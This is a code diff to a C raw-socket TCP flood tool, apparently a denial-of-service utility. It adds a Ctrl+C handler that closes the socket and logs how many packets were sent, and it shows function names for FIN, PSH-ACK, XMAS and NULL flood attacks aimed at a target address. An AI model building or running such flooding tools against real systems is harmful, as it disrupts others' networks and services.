@@ -11,14 +11,13 @@
 #include <arpa/inet.h>
 #include <sys/socket.h>
 #include <netinet/ip.h>
+#include <signal.h>	
 
 #include "tung.h"
 #include "logs.h"
 #include "utils.h"
 
 #define PACKET_LEN 1024
-
-/* TODO: Handle Ctrl+C signal and cleanup stuff */
 
 struct ethheader {
         uint8_t  ether_dhost[6]; /* Destination host address */
@@ -115,6 +114,23 @@ void fin_flood(struct attack_opts_t *opts);
 void psh_ack_flood(struct attack_opts_t *opts);
 void xmas_flood(struct attack_opts_t *opts);
 void null_flood(struct attack_opts_t *opts);
+
+static int global_sock = -1;
+static const char *global_typename = NULL;
+static uint64_t global_packets_count = 0;
+
+void handle_sigint(int sig) {
+    (void)sig; 
+    
+    if (global_sock != -1) {
+        close(global_sock);
+    }
+
+    printf("\n");
+    LOG_INFO("TCP %s Flood interrupted (packets sent: %lu)", 
+             global_typename ? global_typename : "UNKNOWN", global_packets_count);
+    exit(0);
+}
 
 static int create_raw_socket(void) {
         int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
@@ -269,7 +285,7 @@ static void perform_flood_attack(struct attack_opts_t *opts, flood_type_t type) 
         
         const char *type_name = get_flood_type_name(type);
         uint8_t flags = get_flood_flags(type);
-        
+
         LOG_INFO("Started TCP %s Flood attack to %s for %d seconds %s", 
                  type_name, opts->atk_target, opts->atk_duration, 
                  opt_verbose ? "(detailed packet info will be shown)" : "");
@@ -289,12 +305,17 @@ static void perform_flood_attack(struct attack_opts_t *opts, flood_type_t type) 
         memset(&dest_info, 0, sizeof(dest_info));
         dest_info.sin_family = AF_INET;
         dest_info.sin_addr.s_addr = inet_addr(opts->atk_target);
-        
+
         srand((unsigned int)time(NULL));
         time_t start = time(NULL);
-        uint64_t packets_count = 0;
+        register uint64_t packets_count = 0;
 
-        while (should_continue(start, opts->atk_duration)) {
+	global_sock = sock;
+	global_typename = type_name;
+	global_packets_count = 0; 
+	signal(SIGINT, handle_sigint);	
+        
+	while (should_continue(start, opts->atk_duration)) {
                 memset(buffer, 0, PACKET_LEN);
                 
                 setup_ip_header(ip, opts->atk_target, packet_size);
@@ -312,6 +333,7 @@ static void perform_flood_attack(struct attack_opts_t *opts, flood_type_t type) 
                 }
 
                 packets_count++;
+		global_packets_count++;
 
 		if(opts->atk_rate > 0) 
 			usleep(1000000 / opts->atk_rate);
